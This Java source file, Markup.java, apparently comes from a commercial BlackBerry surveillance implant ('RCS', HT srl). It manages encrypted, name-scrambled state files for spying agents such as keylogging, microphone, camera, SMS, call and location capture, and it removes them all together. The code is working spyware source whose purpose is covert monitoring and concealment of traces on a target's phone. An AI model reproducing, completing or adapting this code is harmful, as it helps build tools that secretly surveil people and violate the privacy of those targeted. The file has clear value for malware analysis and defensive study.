/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : Markup.java 
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.log;

import java.io.IOException;

import net.rim.device.api.util.NumberUtilities;
import blackberry.agent.Agent;
import blackberry.config.Keys;
import blackberry.crypto.Encryption;
import blackberry.event.Event;
import blackberry.fs.AutoFlashFile;
import blackberry.fs.Path;
import blackberry.utils.Check;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;
import blackberry.utils.Utils;

public class Markup {

    public static final String MARKUP_EXTENSION = ".qmm";

    private int agentId = 0;

    //#debug
    private static Debug debug = new Debug("Markup", DebugLevel.VERBOSE);

    /**
     * Override della funzione precedente: invece di generare il nome da una
     * stringa lo genera da un numero. Se la chiamata fallisce la funzione torna
     * una stringa vuota.
     */
    static String makeMarkupName(final int agentId, final boolean addPath) {
        // #ifdef DBC
        Check.requires(agentId >= 0, "agentId < 0");
        // #endif
        final String logName = NumberUtilities.toString(agentId, 16, 4);
        // #debug debug
	debug.trace("makeMarkupName from: " + logName);

        final String markupName = makeMarkupName(logName, addPath, false);
        return markupName;
    }

    /**
     * Genera un nome gia' scramblato per un file di Markup, se bAddPath e' TRUE
     * il nome ritornato e' completo del path da utilizzare altrimenti viene
     * ritornato soltanto il nome. Se la chiamata fallisce la funzione torna una
     * stringa vuota. Il nome generato non indica necessariamente un file che
     * gia' non esiste sul filesystem, e' compito del chiamante verificare che
     * tale file non sia gia' presente. Se il parametro facoltativo bStoreToMMC
     * e' impostato a TRUE viene generato un nome che punta alla prima MMC
     * disponibile, se esiste.
     */
    static String makeMarkupName(final String markupName,
            final boolean addPath, final boolean storeToMMC) {
        // #ifdef DBC
        Check.requires(markupName != null, "null markupName");
        // #endif
        // #ifdef DBC
        Check.requires(markupName != "", "empty markupName");
        // #endif

        String encName = "";

        if (addPath) {
            if (storeToMMC && Path.isSDPresent()) {
                encName = Path.SD_PATH;
            } else {
                encName = Path.USER_PATH;
            }
        }

        encName += Encryption.encryptName(markupName + MARKUP_EXTENSION, Keys
                .getInstance().getChallengeKey()[0]);
        // #debug debug
	debug.trace("makeMarkupName: " + encName);

        return encName;
    }

    /**
     * Rimuove il file di markup relativo all'agente uAgentId. La funzione torna
     * TRUE se il file e' stato rimosso o non e' stato trovato, FALSE se non e'
     * stato possibile rimuoverlo.
     */

    public static synchronized void removeMarkup(final int agentId_) {
        // #ifdef DBC
        Check.requires(agentId_ > 0, "agentId null");
        // #endif

        final String markupName = makeMarkupName(agentId_, true);
        // #ifdef DBC
        Check.asserts(markupName != "", "markupName empty");
        // #endif

        final AutoFlashFile file = new AutoFlashFile(markupName, true);
        file.delete();
    }

    /**
     * Rimuove tutti i file di markup presenti sul filesystem.
     */

    public static synchronized void removeMarkups() {
        removeMarkup(Agent.AGENT_MESSAGE);
        removeMarkup(Agent.AGENT_TASK);
        removeMarkup(Agent.AGENT_CALLLIST);
        removeMarkup(Agent.AGENT_DEVICE);
        removeMarkup(Agent.AGENT_POSITION);
        removeMarkup(Agent.AGENT_CALL);
        removeMarkup(Agent.AGENT_CALL_LOCAL);
        removeMarkup(Agent.AGENT_KEYLOG);
        removeMarkup(Agent.AGENT_SNAPSHOT);
        removeMarkup(Agent.AGENT_URL);
        removeMarkup(Agent.AGENT_IM);
        removeMarkup(Agent.AGENT_MIC);
        removeMarkup(Agent.AGENT_CAM);
        removeMarkup(Agent.AGENT_CLIPBOARD);
        removeMarkup(Agent.AGENT_APPLICATION);
        removeMarkup(Agent.AGENT_CRISIS);

        removeMarkup(Event.EVENT_TIMER);
        removeMarkup(Event.EVENT_SMS);
        removeMarkup(Event.EVENT_CALL);
        removeMarkup(Event.EVENT_CONNECTION);
        removeMarkup(Event.EVENT_PROCESS);
        removeMarkup(Event.EVENT_QUOTA);
        removeMarkup(Event.EVENT_SIM_CHANGE);
        removeMarkup(Event.EVENT_AC);
        removeMarkup(Event.EVENT_BATTERY);
        removeMarkup(Event.EVENT_CELLID);
        removeMarkup(Event.EVENT_LOCATION);
    }

    String lognName;

    AutoFlashFile file;

    Encryption encryption;

    LogCollector logCollector;

    private Markup() {
        logCollector = LogCollector.getInstance();
        encryption = new Encryption();
    }

    public Markup(final int agentId_, final byte[] aesKey) {
        this();
        final byte[] key = new byte[16];
        Utils.copy(key, 0, aesKey, 0, 16);

        encryption.makeKey(key);

        this.agentId = agentId_;
    }

    /**
     * Crea un markup vuoto.
     * 
     * @return true if successful
     */
    public boolean createEmptyMarkup() {
        return writeMarkup(null);
    }

    public synchronized boolean isMarkup() {
        // #ifdef DBC
        Check.requires(agentId > 0, "agentId null");
        // #endif

        final String markupName = makeMarkupName(agentId, true);
        // #ifdef DBC
        Check.asserts(markupName != "", "markupName empty");
        // #endif

        final AutoFlashFile fileRet = new AutoFlashFile(markupName, true);

        return fileRet.exists();
    }

    /**
     * Legge il file di markup specificato dall'AgentId (l'ID dell'agente che
     * l'ha generato), torna un array di dati decifrati. Se il file non viene
     * trovato o non e' possibile decifrarlo correttamente, torna null. Se il
     * Markup e' vuoto restituisce un byte[0]. E' possibile creare dei markup
     * vuoti, in questo caso non va usata la ReadMarkup() ma semplicemente la
     * IsMarkup() per vedere se e' presente o meno.
     * 
     * @throws IOException
     */
    public synchronized byte[] readMarkup() throws IOException {
        // #ifdef DBC
        Check.requires(agentId > 0, "agentId null");
        // #endif

        final String markupName = makeMarkupName(agentId, true);
        // #ifdef DBC
        Check.asserts(markupName != "", "markupName empty");
        // #endif

        final AutoFlashFile fileRet = new AutoFlashFile(markupName, true);

        if (fileRet.exists()) {
            final byte[] encData = fileRet.read();
            final int len = Utils.byteArrayToInt(encData, 0);

            final byte[] plain = encryption.decryptData(encData, len, 4);
            // #ifdef DBC
            Check.asserts(plain != null, "wrong decryption: null");
            // #endif
            // #ifdef DBC
            Check.asserts(plain.length == len, "wrong decryption: len");
            // #endif

            return plain;
        } else {
            // #debug debug
	debug.trace("Markup file does not exists");
            return null;
        }
    }

    public synchronized void removeMarkup() {
        // #ifdef DBC
        Check.requires(agentId > 0, "agentId null");
        // #endif

        final String markupName = makeMarkupName(agentId, true);
        // #ifdef DBC
        Check.asserts(markupName != "", "markupName empty");
        // #endif

        final AutoFlashFile remove = new AutoFlashFile(markupName, true);
        remove.delete();
    }

    /**
     * Scrive un file di markup per salvare lo stato dell'agente, il parametro
     * e' il buffer di dati. Al termine della scrittura il file viene chiuso,
     * non e' possibile fare alcuna Append e un'ulteriore chiamata alla
     * WriteMarkup() comportera' la sovrascrittura del vecchio markup. La
     * funzione torna TRUE se e' andata a buon fine, FALSE altrimenti. Il
     * contenuto scritto e' cifrato.
     */
    public synchronized boolean writeMarkup(final byte[] data) {
        final String markupName = makeMarkupName(agentId, true);
        // #ifdef DBC
        Check.asserts(markupName != "", "markupName empty");
        // #endif

        final AutoFlashFile fileRet = new AutoFlashFile(markupName, true);

        // se il file esiste viene azzerato
        fileRet.create();

        if (data != null) {
            final byte[] encData = encryption.encryptData(data);
            // #ifdef DBC
            Check.asserts(encData.length >= data.length, "strange data len");
            // #endif
            fileRet.write(data.length);
            fileRet.append(encData);
        }

        return true;
    }
}
